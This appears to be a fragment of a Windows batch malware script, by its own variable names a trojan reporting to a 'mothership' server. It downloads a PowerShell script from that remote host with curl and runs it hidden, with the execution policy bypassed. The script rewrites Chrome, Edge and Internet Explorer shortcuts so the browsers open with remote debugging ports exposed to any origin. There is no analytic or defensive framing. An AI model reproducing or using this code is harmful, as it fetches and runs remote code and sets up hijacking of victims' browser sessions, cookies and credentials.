curl -o %trojandir%\modify_edge_lnk.ps1 -G %mothership%/ow/assets/modify_edge_lnk.ps1

set chromecmdlinearg=--remote-debugging-port=9223 --remote-allow-origins=^* --restore-last-session --user-data-dir=C:\users\%username%\AppData\Local\Temp\owd\chrome
set edgecmdlinearg=--remote-debugging-port=9222 --remote-allow-origins=^* --restore-last-session --profile-directory=Default
set linkpatha=C:\Users\ADULT2022\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\
set linkpathb=C:\Users\ADULT2022\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\

set execstr=conhost.exe --headless powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %trojandir%\modify_edge_lnk.ps1

IF EXIST %trojandir%\modify_edge_lnk.ps1 (
    cd /d %workdir%

    %execstr% "%chromecmdlinearg%" "%linkpatha%\Google Chrome.lnk"       > %workdir%\modify_edge_lnk.ps1_cmd_chrome_1.log 2>&1
    %execstr% "%edgecmdlinearg%"   "%linkpatha%\Microsoft Edge.lnk"      > %workdir%\modify_edge_lnk.ps1_cmd_edge_1.log 2>&1
    %execstr% "%edgecmdlinearg%"   "%linkpatha%\Microsoft Edge(2).lnk"   > %workdir%\modify_edge_lnk.ps1_cmd_edge_2.log 2>&1
    %execstr% "%edgecmdlinearg%"   "%linkpatha%\Microsoft Edge(3).lnk"   > %workdir%\modify_edge_lnk.ps1_cmd_edge_3.log 2>&1

    %execstr% "%edgecmdlinearg%" "%linkpathb%\Internet Explorer.lnk" > %workdir%\modify_edge_lnk.ps1_cmd_edge_4.log 2>&1
)
